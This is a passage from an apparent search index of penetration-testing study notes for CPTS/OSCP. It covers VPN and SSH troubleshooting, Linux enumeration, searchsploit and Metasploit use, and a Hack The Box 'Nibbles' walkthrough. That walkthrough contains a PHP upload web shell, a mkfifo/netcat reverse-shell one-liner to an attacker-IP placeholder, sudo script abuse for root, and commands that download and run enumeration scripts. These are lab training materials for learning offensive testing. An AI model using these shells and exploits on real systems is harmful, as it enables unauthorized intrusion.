environments.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Common%20Pitfalls%20and%20Troubleshooting%20in%20VPN%20and%20SSH%20Connections/#vpn-issues","title":"VPN Issues","text":"<p>1. Still Connected to VPN After connecting to the HTB VPN, the first thing you should check is whether the connection was successful. You can verify this by looking for the message <code>Initialization Sequence Completed</code> in the terminal output after running the <code>openvpn</code> command.</p> <pre><code>$ sudo openvpn ./htb.ovpn\n...SNIP...\nInitialization Sequence Completed\n</code></pre> <p>2. Getting VPN Address To check if your VPN is connected properly, use the following command to inspect the IP address assigned to the tun0 adapter:</p> <pre><code>$ ip -4 a show tun0\n</code></pre> <p>You should see an IP address like <code>10.10.14.x</code> in the output, confirming your VPN connection.</p> <p>3. Checking Routing Table Another way to confirm VPN connectivity is to check your routing table with the command:</p> <pre><code>$ sudo netstat -rn\n</code></pre> <p>This will show the routes, including those created by your VPN. Ensure the <code>tun0</code> interface has a route to the HTB network.</p> <p>4. Pinging the Gateway You can also test connectivity by pinging the HTB gateway:</p> <pre><code>$ ping -c 4 10.10.14.1\n</code></pre> <p>If you get a response, you\u2019re connected and ready to enumerate live hosts.</p> <p>5. Working on Multiple Devices Remember, HTB VPN cannot connect on more than one device at the same time. Ensure you disconnect from one device before connecting on another (e.g., from your Parrot VM to your Windows VM).</p> <p>6. Choosing the Right Region If you experience lag or high latency during your VPN connection, ensure you are connected to the closest server. For example, HTB has servers in Europe, the USA, Australia, and Singapore.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Common%20Pitfalls%20and%20Troubleshooting%20in%20VPN%20and%20SSH%20Connections/#ssh-key-troubleshooting-and-management","title":"SSH Key Troubleshooting and Management","text":"<p>When working with SSH connections, a few key management practices can prevent connection issues.</p> <p>1. Changing or Generating New SSH Keys If you're having issues with your SSH connection, outdated or corrupted SSH keys might be the cause. Use the <code>ssh-keygen</code> command to create new keys.</p> <pre><code>$ ssh-keygen\nGenerating public/private rsa key pair.\nEnter file in which to save the key (/home/user/.ssh/id_rsa):\nEnter passphrase (empty for no passphrase):\nYour identification has been saved in /home/user/.ssh/id_rsa\n</code></pre> <p>Your keys are typically saved in the <code>~/.ssh</code> directory. You can also specify a different location when prompted. Using a passphrase adds an additional layer of security to your SSH key.</p> <p>2. Updating SSH Keys If your keys are stored on a remote server, you may need to copy the newly generated public key to that server using <code>ssh-copy-id</code>:</p> <pre><code>$ ssh-copy-id user@remote_host\n</code></pre> <p>This will add your public key to the <code>~/.ssh/authorized_keys</code> file on the remote host, allowing you to authenticate without a password in the future.</p> <p>3. Deleting Old SSH Keys If old or unused keys are cluttering your <code>.ssh</code> directory, you can clean them up by deleting the unnecessary files:</p> <pre><code>$ rm ~/.ssh/id_rsa_old ~/.ssh/id_rsa_old.pub\n</code></pre> <p>Be sure to only delete keys that are no longer in use.</p> <p>4. Checking SSH Logs If SSH connections fail, the logs on the server can provide useful information. Check the SSH logs with:</p> <pre><code>$ sudo tail -f /var/log/auth.log  # For Ubuntu/Debian\n$ sudo tail -f /var/log/secure    # For CentOS/RHEL\n</code></pre> <p>5. Testing SSH Connectivity Use the following command to test basic SSH connectivity and identify issues such as permission errors or incorrect keys:</p> <pre><code>$ ssh -v user@remote_host\n</code></pre> <p>The <code>-v</code> flag provides verbose output, helping you troubleshoot any connection problems.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Common%20Pitfalls%20and%20Troubleshooting%20in%20VPN%20and%20SSH%20Connections/#burp-suite-proxy-issues","title":"Burp Suite Proxy Issues","text":"<p>1. Not Disabling Proxy A common issue when using Burp Suite is forgetting to disable the browser proxy after closing Burp. Ensure that the proxy is turned off in the browser settings or by using the FoxyProxy plugin.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Common%20Pitfalls%20and%20Troubleshooting%20in%20VPN%20and%20SSH%20Connections/#study-tips","title":"Study Tips","text":"<ol> <li>Practice Regularly: VPN and SSH troubleshooting will become second nature with practice. Every time you encounter an issue, take the time to resolve it manually.</li> <li>Document Your Process: Keep notes on your troubleshooting steps and key commands in case you encounter similar issues in the future.</li> <li>Explore Other Methods: Don't rely on a single tool for connecting to remote systems. Experiment with multiple VPN and SSH clients to broaden your experience.</li> <li>Understand the Logs: Get familiar with SSH and system logs, as they are invaluable when troubleshooting connectivity and authentication problems.</li> <li>Stay Updated: Always ensure you are using the latest versions of OpenVPN, SSH, and other tools, as older versions may have bugs or security issues that can affect your workflow.</li> </ol>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Folder%20Structure/","title":"Folder Structure","text":"<p>![[folder_structure.png]]</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Folder%20Structure/#common-penetration-testing-terms","title":"Common Penetration Testing Terms:","text":"<ol> <li>Shell:<ul> <li>Definition: A program that allows interaction with an operating system via command-line inputs.</li> <li>Types:<ul> <li>Reverse Shell: The target machine connects back to the attacker's machine.</li> <li>Bind Shell: The target machine listens for a connection from the attacker.</li> <li>Web Shell: Runs commands via a browser (typically less interactive).</li> </ul> </li> </ul> </li> <li> <p>Port:</p> <ul> <li> <p>Definition: Virtual points where network connections begin and end, used to differentiate traffic types.</p> </li> <li> <p>Categories:</p> <ul> <li>TCP (Transmission Control Protocol): Connection-oriented; reliable, requires a handshake.</li> <li> <p>UDP (User Datagram Protocol): Connectionless; faster, less reliable.</p> <ul> <li>Common Ports:</li> </ul> </li> <li> <p>20/21 (FTP), 22 (SSH), 80 (HTTP), 443 (HTTPS), 3389 (RDP).</p> </li> </ul> </li> </ul> </li> </ol> Protocols Port(s) FTP 20 / 21 (TCP) SSH 22 (TCP) Telnet 23 (TCP) SMTP 25 (TCP) HTTP 80 (TCP) SNMP 161 (TCP/UDP) LDAP 389\u00a0(TCP/UDP) SSL / TLS (HTTPS) 443 (TCP) SMB 445 (TCP) RDP 3389 (TCP) <ol> <li>Web Server:<ul> <li>Definition: Software that handles HTTP/HTTPS traffic and connects users to web application components.</li> <li>Vulnerabilities: Can expose a server to attacks if misconfigured or vulnerable, making it a target for penetration testing.</li> </ul> </li> <li>OWASP Top 10 (Web Application Vulnerabilities):<ul> <li>1. Broken Access Control: Improper restrictions allowing unauthorized access.</li> <li>2. Cryptographic Failures: Weak encryption leading to sensitive data exposure.</li> <li>3. Injection: Inserting malicious data (e.g., SQL injection) into applications.</li> <li>4. Insecure Design: Applications not designed with security in mind.</li> <li>5. Security Misconfiguration: Weak security settings, default configurations, verbose errors.</li> <li>6. Vulnerable Components: Using outdated or vulnerable software components.</li> <li>7. Identification &amp; Authentication Failures: Issues related to user identity and authentication.</li> <li>8. Software &amp; Data Integrity Failures: Using untrusted sources leading to integrity issues.</li> <li>9. Security Logging &amp; Monitoring Failures: Lack of monitoring leads to missed breach detections.</li> <li>10. Server-Side Request Forgery (SSRF): Application fetches resources without validating user input, exposing the server to remote requests.</li> </ul> </li> </ol> <p>These terms and concepts are essential in penetration testing to understand vulnerabilities and how attackers gain access to systems.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Get%20OS%20Information/","title":"Get OS Information","text":"","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Get%20OS%20Information/#references","title":"References","text":"<ul> <li>Example Tutorial</li> <li>OSCP Exploit Documentation</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Get%20OS%20Information/#1-get-os-information","title":"1. Get OS Information","text":"<p>Use the following commands to determine the operating system and kernel version:</p> <ul> <li><code>uname -a</code> (Displays system information)</li> <li><code>cat /etc/*release</code> (Displays OS distribution info)</li> <li><code>hostnamectl</code> (Provides detailed info about the OS)</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Get%20OS%20Information/#2-check-the-path-any-writable-folder","title":"2. Check the PATH, Any Writable Folder?","text":"<ul> <li> <p>Check the PATH variable with <code>echo $PATH</code>.</p> </li> <li> <p>Use <code>find</code> to identify writable directories in your PATH:</p> <p>```bash    find $(echo $PATH | tr ':' ' ') -writable 2&gt;/dev/null</p> <p>```</p> </li> <li> <p>To check general writable directories:</p> <p>```bash    find / -type d -writable 2&gt;/dev/null</p> <p>```</p> </li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Get%20OS%20Information/#3-check-environment-variables-for-sensitive-details","title":"3. Check Environment Variables for Sensitive Details","text":"<ul> <li> <p>List all environment variables:</p> <pre><code>printenv\n</code></pre> </li> <li> <p>Look for sensitive details like credentials, keys, or secrets.</p> </li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Get%20OS%20Information/#4-search-for-kernel-exploits-eg-dirtycow","title":"4. Search for Kernel Exploits (e.g., DirtyCow)","text":"<ul> <li> <p>Use <code>uname -r</code> to get the kernel version.</p> </li> <li> <p>Search for kernel exploits (manual search via exploit databases):</p> <ul> <li>DirtyCow: Check if the system is vulnerable by matching the kernel version against public exploit information:</li> </ul> <p>```bash    searchsploit dirtycow</p> <p>```</p> </li> <li> <p>Use automated tools like LinEnum or Linux Exploit Suggester:</p> <p>```bash   wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh chmod +x LinEnum.sh ./LinEnum.sh</p> <pre><code>```bash\nwget &lt;https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh&gt;\nchmod +x linux-exploit-suggester.sh\n./linux-exploit-suggester.sh\n</code></pre> </li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Get%20OS%20Information/#5-check-if-the-sudo-version-is-vulnerable","title":"5. Check if the <code>sudo</code> Version is Vulnerable","text":"<ul> <li> <p>First, check the <code>sudo</code> version:</p> <pre><code>sudo -V\n</code></pre> </li> <li> <p>Then, search for vulnerabilities based on the version:</p> <pre><code>searchsploit sudo\n</code></pre> </li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Get%20OS%20Information/#6-check-dmesg-for-errors-like-signature-verification-failed","title":"6. Check <code>dmesg</code> for Errors like Signature Verification Failed","text":"<ul> <li> <p>View kernel messages to look for any signature verification failures or other security-related logs:</p> <pre><code>dmesg | grep -i \"signature verification\"\n</code></pre> </li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Get%20OS%20Information/#7-more-system-enumeration-date-system-stats-cpu-info-printers","title":"7. More System Enumeration (Date, System Stats, CPU Info, Printers)","text":"<ul> <li> <p>Date and time:</p> <pre><code>date\n</code></pre> </li> <li> <p>System uptime and load:</p> <pre><code>uptime\n</code></pre> </li> <li> <p>CPU information:</p> <pre><code>lscpu\ncat /proc/cpuinfo\n</code></pre> </li> <li> <p>Memory and swap usage:</p> <pre><code>free -h\n</code></pre> </li> <li> <p>Disk usage:</p> <pre><code>df -h\n</code></pre> </li> <li> <p>Printers:</p> <pre><code>lpstat -p\n</code></pre> </li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Get%20OS%20Information/#8-enumerate-defenses-firewalls-apparmor-selinux-etc","title":"8. Enumerate Defenses (Firewalls, AppArmor, SELinux, etc.)","text":"<ul> <li> <p>Check for firewall rules (iptables):</p> <pre><code>iptables -L\n</code></pre> </li> <li> <p>Check if SELinux is enabled:</p> <pre><code>getenforce\nsestatus\n</code></pre> </li> <li> <p>Check if AppArmor is enabled:</p> <pre><code>aa-status\n</code></pre> </li> <li> <p>List running services (some might be security services):</p> <pre><code>systemctl list-units --type=service --state=running\n</code></pre> </li> <li> <p>Check for security tools (e.g., intrusion detection systems like <code>tripwire</code>, <code>aide</code>):</p> <pre><code>ps aux | grep -i \"tripwire\\\\|aide\"\n</code></pre> </li> </ul> <p>By following these steps, you can thoroughly enumerate a system and identify potential security weaknesses or misconfigurations.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Public%20Exploits/","title":"Public Exploits","text":"","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Public%20Exploits/#references","title":"References","text":"<ul> <li>Example Tutorial</li> <li>OSCP Exploit Documentation</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Public%20Exploits/#1-public-exploits","title":"1. Public Exploits","text":"<ul> <li>Objective: Identify vulnerabilities in running services.</li> <li> <p>Tools:</p> <ul> <li> <p>Searchsploit: Use this tool to search for known exploits of services running on the target.Example:</p> <pre><code>searchsploit openssh 7.2\n</code></pre> </li> <li> <p>Google Search: A simple way to search for vulnerabilities.Example:</p> <pre><code>\"&lt;service/application&gt; exploit CVE\"\n</code></pre> </li> </ul> </li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Public%20Exploits/#2-using-searchsploit","title":"2. Using Searchsploit","text":"<ul> <li> <p>Install Searchsploit:</p> <pre><code>sudo apt install exploitdb -y\n</code></pre> </li> <li> <p>Search for Exploits:</p> <pre><code>sudo searchsploit &lt;service_name&gt; &lt;version&gt;\n</code></pre> </li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Public%20Exploits/#3-metasploit-framework-msf","title":"3. Metasploit Framework (MSF)","text":"<ul> <li>Purpose: To use existing exploits and payloads for vulnerability testing.</li> <li> <p>Steps:</p> <ol> <li> <p>Launch Metasploit:</p> <pre><code>sudo msfconsole\n</code></pre> </li> <li> <p>Search for Exploit:</p> <pre><code>search exploit eternalblue\n</code></pre> </li> <li> <p>Use Exploit:</p> <pre><code>use exploit/windows/smb/ms17_010_psexec\n</code></pre> </li> <li> <p>Set Exploit Options:</p> <ul> <li> <p>Set the target host (RHOSTS) and attacker\u2019s host (LHOST).Example:</p> <pre><code>set RHOSTS &lt;target_ip&gt;\nset LHOST tun0\n</code></pre> </li> </ul> </li> <li> <p>Run the Exploit:</p> <ul> <li> <p>Verify the target\u2019s vulnerability:</p> <pre><code>check\n</code></pre> </li> <li> <p>Execute the exploit:</p> <pre><code>exploit\n</code></pre> </li> </ul> </li> <li> <p>Post-exploitation:</p> <ul> <li> <p>Once a session is open, gain full control with:Example to check privileges:</p> <pre><code>meterpreter &gt; shell\n</code></pre> <pre><code>getuid\n</code></pre> </li> </ul> </li> </ol> </li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Public%20Exploits/#4-practice","title":"4. Practice","text":"<ul> <li>Recommended retired Hack The Box machines for practicing Metasploit:<ul> <li>Granny/Grandpa</li> <li>Jerry</li> <li>Blue</li> <li>Legacy</li> <li>Devel</li> </ul> </li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Public%20Exploits/#quick-notes-for-examtest-use","title":"Quick Notes for Exam/Test Use:","text":"<ul> <li>Search for Exploits: Always start with Nmap, Searchsploit, or Google.</li> <li>Metasploit Basics:<ul> <li>Launch \u2192 <code>msfconsole</code></li> <li>Search \u2192 <code>search exploit &lt;vulnerability&gt;</code></li> <li>Use Exploit \u2192 <code>use exploit/&lt;path&gt;</code></li> <li>Set Options \u2192 <code>set RHOSTS &lt;target_ip&gt;</code>, <code>set LHOST &lt;your_ip&gt;</code></li> <li>Run \u2192 <code>exploit</code></li> </ul> </li> <li>Don\u2019t Rely Solely on Metasploit: Practice manual exploitation and use other tools when needed.</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Public%20Exploits/#exercise","title":"Exercise","text":"<p>Try to identify the services running on the server above, and then try to search to find public exploits to exploit them. Once you do, try to get the content of the '/flag.txt' file. (note: the web server may take a few seconds to start)</p> <ol> <li>search for payload that reads files</li> </ol> <pre><code>msf &gt; use auxiliary/scanner/http/wp_simple_backup_file_read\nset RHOSTS\nset RPORT\nset FILEPATH &lt;/FLAG.TXT&gt;\n// run then you will get a link where you cant cat it and see the flag. \n</code></pre>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/","title":"Starting Out","text":"","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#references","title":"References","text":"<ul> <li>Ippsec Video: YouTube</li> <li>Walkthrough: 0xdf\u2019s Blog</li> </ul> OWASP Juice Shop Is a modern vulnerable web application written in Node.js, Express, and Angular which showcases the entire\u00a0OWASP Top Ten\u00a0along with many other real-world application security flaws. Metasploitable 2 Is a purposefully vulnerable Ubuntu Linux VM that can be used to practice enumeration, automated, and manual exploitation. Metasploitable 3 Is a template for building a vulnerable Windows VM configured with a wide range of\u00a0vulnerabilities. DVWA This is a vulnerable PHP/MySQL web application showcasing many common web application vulnerabilities with varying degrees of difficulty.","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#youtube-channels","title":"YouTube Channels","text":"<p>There are many YouTube channels out there that showcase penetration testing/hacking techniques. A few worth bookmarking are:</p> IppSec Provides an extremely in-depth walkthrough of every retired HTB box packed full of insight from his own experience, as well as videos on various techniques.| VbScrub Provides HTB videos as well as videos on techniques, primarily focusing on Active Directory exploitation. ST\u00d6K Provides videos on various infosec related topics, mainly focusing on bug bounties and web application penetration testing. LiveOverflow Provides videos on a wide variety of technical infosec topics. https://0xdf.gitlab.io/","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#tutorial-websites","title":"Tutorial Websites","text":"<p>There are many tutorial websites out there for practicing fundamental IT skills, such as scripting.</p> <p>Two great tutorial websites are\u00a0Under The Wire\u00a0and\u00a0Over The Wire. These websites are set up to help train users on using both Windows\u00a0<code>PowerShell</code>\u00a0and the Linux command line, respectively, through various scenarios in a \"war games\" format.</p> <p>They take the user through various levels, consisting of tasks or challenges to training them on fundamental to advanced Windows and Linux command line usage and\u00a0<code>Bash</code>\u00a0and\u00a0<code>PowerShell</code>\u00a0scripting. These skills are paramount for anyone looking to succeed in this industry.</p> <p>https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology and Resources/Reverse Shell Cheatsheet.md</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#box-nibbles-enumeration","title":"Box: Nibbles - Enumeration","text":"<p>When writing this, there are 201 standalone boxes on Hack The Box (HTB) available for VIP members. Each retired machine comes with an official HTB walkthrough, and additional blog posts or video tutorials can be easily found via Google.</p> <p>Let's dive into Nibbles, a Linux-based, easy-rated box. It highlights essential penetration testing skills like enumeration, web application exploitation, and privilege escalation through a file misconfiguration.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#machine-overview","title":"Machine Overview:","text":"<ul> <li>Name: Nibbles</li> <li>Creator: mrb3n</li> <li>Operating System: Linux</li> <li>Difficulty: Easy</li> <li>User Path: Web</li> <li>Privilege Escalation: World-writable file/Sudoers misconfiguration</li> <li>Ippsec Video: YouTube</li> <li>Walkthrough: 0xdf\u2019s Blog</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#enumeration-and-approaches","title":"Enumeration and Approaches","text":"<p>Enumeration is the starting point of any machine, and the more information you gather, the better. With HTB's Nibbles, we already know it's a Linux box with a web attack vector, making this a grey-box test, where partial information is available. This process contrasts with HTB's active machines, which take a black-box approach, providing just the IP and OS type.</p> <p>Types of Penetration Testing:</p> <ul> <li>Black-Box: The tester has minimal to no information about the target, simulating a real-world attack. It\u2019s thorough but may miss certain vulnerabilities.</li> <li>Grey-Box: The tester has partial information such as IPs or low-level credentials, which simulates insider threats or attackers with limited access.</li> <li>White-Box: The tester has full access, including credentials, source code, or network diagrams. This method provides a comprehensive evaluation of the target's security.</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#nmap-scanning","title":"Nmap Scanning","text":"<p>Let\u2019s kick off with Nmap to identify open ports and services using the command:</p> <pre><code>nmap -sV --open -oA nibbles_initial_scan &lt;target IP&gt;\n</code></pre> <p>This command:</p> <ul> <li>sV: Enumerates service versions.</li> <li>-open: Displays only open ports.</li> <li>oA: Saves output in all formats (XML, Greppable, and Text).</li> </ul> <p>An important habit in penetration testing is note-taking. Save scan outputs for future reference, as this will assist during the reporting phase and prevent evidence loss.</p> <p>The Nibbles - Web Footprinting example highlights a typical process of performing enumeration and vulnerability discovery on a web application. Here\u2019s a step-by-step breakdown of the key steps:</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#1-web-application-identification","title":"1. Web Application Identification:","text":"<ul> <li>Using whatweb on the target IP reveals basic information: Apache 2.4.18 is the web server running on Ubuntu.</li> <li>The homepage shows a simple \"Hello world!\" message with no immediate clues about the application.</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#2-page-source-inspection","title":"2. Page Source Inspection:","text":"<ul> <li>Viewing the page source reveals an HTML comment suggesting there\u2019s a <code>/nibbleblog/</code> directory.</li> <li>This directory can be queried to reveal additional application-specific details.</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#3-application-fingerprinting","title":"3. Application Fingerprinting:","text":"<ul> <li>Running whatweb on <code>/nibbleblog</code> shows that the application is Nibbleblog, a PHP-based blogging platform.</li> <li>Some web technologies in use, like HTML5, jQuery, and PHP, are also identified.</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#4-directory-enumeration","title":"4. Directory Enumeration:","text":"<ul> <li>Using Gobuster, you perform directory brute-forcing to uncover accessible directories like <code>/admin</code>, <code>/content</code>, <code>/themes</code>, etc.</li> <li>The <code>/README</code> file reveals that the Nibbleblog version is 4.0.3, which is vulnerable to an authenticated file upload vulnerability.</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#5-exploring-the-admin-portal","title":"5. Exploring the Admin Portal:","text":"<ul> <li>Browsing to <code>/admin.php</code> brings up the admin login portal, but common credentials like <code>admin:admin</code> or <code>admin:password</code> fail.</li> <li>IP blacklisting prevents brute-force attempts, making tools like Hydra ineffective.</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#6-exploring-directory-listings","title":"6. Exploring Directory Listings:","text":"<ul> <li>Browsing <code>/themes/</code> and <code>/content/</code> uncovers some interesting files like <code>users.xml</code>, confirming the username is <code>admin</code>.</li> <li>However, the password is still missing.</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#7-gathering-additional-clues","title":"7. Gathering Additional Clues:","text":"<ul> <li>The <code>config.xml</code> file contains some site-specific configuration, but no passwords.</li> <li>The site's title and notifications mention \"nibbles,\" prompting the idea to try \"nibbles\" as the password for the admin login.</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#8-successful-login","title":"8. Successful Login:","text":"<ul> <li>Using <code>admin:nibbles</code> grants access to the admin panel, allowing further exploitation.</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#9-concluding-remarks","title":"9. Concluding Remarks:","text":"<ul> <li>The importance of thorough enumeration and notetaking is emphasized. Even simple environments can yield valuable information with patience and methodical enumeration.</li> <li>This methodology is crucial whether targeting a simple web app or a large enterprise network.</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#key-tools-used","title":"Key Tools Used:","text":"<ul> <li>whatweb: To identify web technologies.</li> <li>curl: To retrieve and inspect HTTP responses.</li> <li>Gobuster: For directory brute-forcing.</li> <li>Nmap: For initial port scanning.</li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#vulnerability-identified","title":"Vulnerability Identified:","text":"<ul> <li>Nibbleblog 4.0.3 is vulnerable to authenticated file upload exploitation, potentially allowing for arbitrary code execution after gaining admin access.</li> </ul> <p>This example illustrates the standard process used in web application penetration testing: identifying technologies, enumerating directories, fingerprinting applications, and leveraging known exploits to gain access.</p> <p>This walkthrough for the \"Nibbles\" machine details how to exploit a vulnerable version of the Nibbleblog platform to gain remote code execution and ultimately a reverse shell. Here's the process summarized:</p> <ol> <li> <p>Admin Portal Enumeration: After logging in, the admin portal contains several pages, but the <code>My image</code> plugin catches our attention. It allows us to upload image files, which we might be able to exploit by uploading PHP code instead.</p> </li> <li> <p>PHP Code Upload: By uploading a PHP snippet (<code>&lt;?php system('id'); ?&gt;</code>), we attempt to gain code execution. The upload results in some errors, but we find the uploaded file in the <code>/content/private/plugins/my_image/</code> directory. Running it confirms we have code execution on the server.</p> </li> <li> <p>Reverse Shell: We modify the PHP file to include a Bash reverse shell one-liner:</p> <pre><code>&lt;?php system (\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;ATTACKING IP&gt; &lt;LISTENING PORT&gt; &gt;/tmp/f\"); ?&gt;\n</code></pre> <p>After uploading the file and triggering the execution, we catch a reverse shell.</p> </li> <li> <p>Shell Upgrade: Since the shell we receive is basic, we upgrade it to a fully interactive TTY using Python 3:</p> <p>```bash    python3 -c 'import pty; pty.spawn(\"/bin/bash\")'</p> <p>```</p> <p>This enables us to run more commands like <code>su</code> or use a text editor.</p> </li> <li> <p>Post-exploitation: In <code>/home/nibbler</code>, we locate the <code>user.txt</code> flag and a file named <code>personal.zip</code>.</p> </li> </ol> <p>This step-by-step process effectively demonstrates gaining a foothold through a vulnerable plugin, escalating access to a reverse shell, and post-exploitation techniques.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#nibbles-privilege-escalation-section","title":"Nibbles - Privilege Escalation section:","text":"<ol> <li> <p>Unzipping <code>personal.zip</code>:</p> <ul> <li>Inside the <code>/home/nibbler</code> directory, unzip <code>personal.zip</code>, revealing a script file: <code>monitor.sh</code>.</li> <li>The script is writeable and owned by the <code>nibbler</code> user, meaning we can modify it.</li> <li> <p>Script Content:</p> </li> <li> <p>The <code>monitor.sh</code> script is a basic monitoring script.</p> </li> <li>Since it's owned by <code>nibbler</code> and writeable, this presents an opportunity for privilege escalation.</li> <li> <p>Using LinEnum.sh for Escalation Checks:</p> </li> <li> <p>Download <code>LinEnum.sh</code> from the attack machine to the target using <code>wget</code> and run it.</p> </li> <li> <p>LinEnum reveals that <code>nibbler</code> can run <code>monitor.sh</code> as root without needing a password:</p> <pre><code>bash\nCopy code\n(root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh\n</code></pre> </li> </ul> </li> <li> <p>Exploiting the Script:</p> <ul> <li> <p>Since we can run <code>monitor.sh</code> as root, append a reverse shell one-liner to it:</p> <pre><code>echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;ATTACKER_IP&gt; 8443 &gt;/tmp/f' | tee -a monitor.sh\n</code></pre> </li> <li> <p>Replace <code>&lt;ATTACKER_IP&gt;</code> with your attack machine's IP address.</p> </li> </ul> </li> <li> <p>Explanation</p> <ul> <li><code>rm /tmp/f</code>: Removes any existing named pipe.</li> <li><code>mkfifo /tmp/f</code>: Creates a named pipe at <code>/tmp/f</code>.</li> <li><code>cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc &lt;YOUR_IP&gt; 8443 &gt;/tmp/f</code>: This sends the output of the shell (<code>/bin/sh -i</code>) through a network connection to your attack machine using netcat (<code>nc</code>).</li> </ul> </li> <li> <p>Executing the Script:</p> <ul> <li> <p>Run the modified <code>monitor.sh</code> script using <code>sudo</code>:</p> <pre><code>sudo /home/nibbler/personal/stuff/monitor.sh\n</code></pre> </li> </ul> </li> <li> <p>Catching the Reverse Shell:</p> <ul> <li> <p>Set up a listener on the attack machine:</p> <pre><code>nc -lvnp 8443\n</code></pre> </li> <li> <p>Once the script is executed, catch the root shell.</p> </li> </ul> </li> <li> <p>Root Access:</p> <ul> <li> <p>After gaining the root shell, you can confirm access by running:</p> <pre><code>id\n</code></pre> </li> <li> <p>Grab the <code>root.txt</code> flag.</p> </li> </ul> </li> </ol> <p>Key Points:</p> <ul> <li>The ability to write to a file (<code>monitor.sh</code>) that can be run with root privileges (via <code>sudo</code>) allows us to escalate privileges.</li> <li>Always make a backup of the file before modifying it to prevent disruptions.</li> <li>Running <code>LinEnum.sh</code> helped discover the key vulnerability for privilege escalation.</li> </ul> <p>Nibbles - Alternate User Method - Metasploit\" process, including how to perform the steps, along with study tips at the end.</p>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#step-by-step-guide","title":"Step-by-Step Guide:","text":"","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#1-starting-metasploit","title":"1. Starting Metasploit","text":"<ul> <li> <p>The first step in this process is to start Metasploit by typing <code>msfconsole</code> in your terminal.</p> <pre><code>msfconsole\n</code></pre> </li> <li> <p>Metasploit is a powerful tool for automating penetration testing tasks like exploitation, payload generation, and vulnerability scanning. Using it helps you quickly identify and exploit weaknesses in systems.</p> </li> </ul>","tags":["#oscp","#technique","#exploitation"]},{"location":"CPTS/Getting%20Started/Starting%20Out/#2-searching-for-the-exploit","title":"2. Searching for the Exploit","text":"<ul> <li> <p>Once Metasploit is loaded, search for exploits related to Nibbleblog:</p> <pre><code>search nibbleblog\n</code></pre> </li> <li> <p>You will see a list of matching 